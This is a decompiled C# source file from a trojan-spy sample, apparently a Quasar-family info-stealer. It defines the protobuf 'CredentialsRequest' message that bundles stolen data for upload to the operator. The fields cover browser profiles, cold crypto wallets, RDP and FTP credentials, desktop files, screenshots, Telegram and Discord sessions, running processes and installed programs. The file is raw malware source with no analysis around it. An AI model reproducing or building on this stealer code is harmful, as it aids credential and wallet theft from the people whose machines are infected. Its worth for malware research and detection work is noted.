// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Requests.CredentialsRequest
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Common;
using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Requests
{
  [ProtoContract(Name = "CredentialsRequest")]
  public class CredentialsRequest : INotifyPropertyChanged
  {
    private byte[] _screenshot;
    private List<FtpCredential> _ftpCredentials;
    private List<DesktopFile> _desktopFiles;
    private List<RdpCredential> _rdpConnections;
    private List<ColdWallet> _coldWallets;
    private List<BrowserProfile> _browserProfiles;
    private List<RemoteProcess> _processList;
    private List<string> _installedPrograms;
    private RemoteClientInformation _clientInformation;
    private TelegramSession _telegram;
    private DiscordSession _discord;
    private List<int> _tasksIds;

    [ProtoMember(1, Name = "ClientInformation")]
    public RemoteClientInformation ClientInformation
    {
      get => this._clientInformation;
      set
      {
        this._clientInformation = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (ClientInformation)));
      }
    }

    [ProtoMember(2, Name = "BrowserProfiles")]
    public List<BrowserProfile> BrowserProfiles
    {
      get => this._browserProfiles ?? (this._browserProfiles = new List<BrowserProfile>());
      set
      {
        this._browserProfiles = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (BrowserProfiles)));
      }
    }

    [ProtoMember(3, Name = "ColdWallets")]
    public List<ColdWallet> ColdWallets
    {
      get => this._coldWallets ?? (this._coldWallets = new List<ColdWallet>());
      set
      {
        this._coldWallets = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs("BrowserProfiles"));
      }
    }

    [ProtoMember(4, Name = "RdpConnections")]
    public List<RdpCredential> RdpConnections
    {
      get => this._rdpConnections ?? (this._rdpConnections = new List<RdpCredential>());
      set
      {
        this._rdpConnections = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (RdpConnections)));
      }
    }

    [ProtoMember(5, Name = "DesktopFiles")]
    public List<DesktopFile> DesktopFiles
    {
      get => this._desktopFiles ?? (this._desktopFiles = new List<DesktopFile>());
      set
      {
        this._desktopFiles = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (DesktopFiles)));
      }
    }

    [ProtoMember(6, Name = "FtpCredentials")]
    public List<FtpCredential> FtpCredentials
    {
      get => this._ftpCredentials ?? (this._ftpCredentials = new List<FtpCredential>());
      set
      {
        this._ftpCredentials = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (FtpCredentials)));
      }
    }

    [ProtoMember(7, Name = "Screenshot")]
    public byte[] Screenshot
    {
      get => this._screenshot;
      set
      {
        this._screenshot = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Screenshot)));
      }
    }

    [ProtoMember(8, Name = "TelegramSession")]
    public TelegramSession Telegram
    {
      get => this._telegram;
      set
      {
        this._telegram = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Telegram)));
      }
    }

    [ProtoMember(9, Name = "DiscordSession")]
    public DiscordSession Discord
    {
      get => this._discord;
      set
      {
        this._discord = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (Discord)));
      }
    }

    [ProtoMember(10, Name = "RemoteProcess")]
    public List<RemoteProcess> ProcessList
    {
      get => this._processList;
      set
      {
        this._processList = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (ProcessList)));
      }
    }

    [ProtoMember(11, Name = "InstalledPrograms")]
    public List<string> InstalledPrograms
    {
      get => this._installedPrograms;
      set
      {
        this._installedPrograms = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (InstalledPrograms)));
      }
    }

    [ProtoMember(12, Name = "CompletedTasks")]
    public List<int> CompletedTasks
    {
      get => this._tasksIds;
      set
      {
        this._tasksIds = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (CompletedTasks)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;
  }
}
